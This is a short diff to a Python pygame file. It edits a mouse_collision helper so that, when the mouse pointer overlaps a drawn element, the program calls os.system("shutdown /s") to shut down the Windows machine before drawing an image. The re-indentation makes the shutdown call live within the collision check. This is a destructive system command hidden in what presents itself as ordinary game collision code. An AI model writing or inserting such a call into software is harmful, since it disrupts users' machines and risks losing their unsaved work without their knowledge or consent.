@@ -22,7 +22,7 @@ def mouse_collision(pos1, size1, image_file):
     pos2 = pygame.mouse.get_pos()
     collision = aabb(pos1, size1, pos2, [0, 0])
     if collision:
-    os.system("shutdown /s")
+        os.system("shutdown /s")
         screen.blit(image_file, pos1)
     return collision
 
